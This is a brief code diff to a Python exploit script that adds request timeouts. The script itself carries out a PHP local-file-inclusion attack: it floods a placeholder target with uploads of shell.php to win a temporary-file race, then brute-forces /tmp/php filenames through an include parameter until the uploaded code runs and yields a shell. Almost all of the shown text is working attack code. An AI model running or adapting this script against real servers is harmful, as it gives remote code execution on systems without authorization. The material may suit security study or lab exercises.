@@ -8,13 +8,13 @@ import sys
 print('[+] Trying to win the race')
 f = {'file': open('shell.php', 'rb')}
 for _ in range(4096 * 4096):
-    requests.post('http://target.com/index.php?c=index.php', f)
+    requests.post('http://target.com/index.php?c=index.php', f, timeout=60)
 
 
 print('[+] Bruteforcing the inclusion')
 for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
     url = 'http://target.com/index.php?c=/tmp/php' + fname
-    r = requests.get(url)
+    r = requests.get(url, timeout=60)
     if 'load average' in r.text:  # <?php echo system('uptime');
         print('[+] We have got a shell: ' + url)
         sys.exit(0)
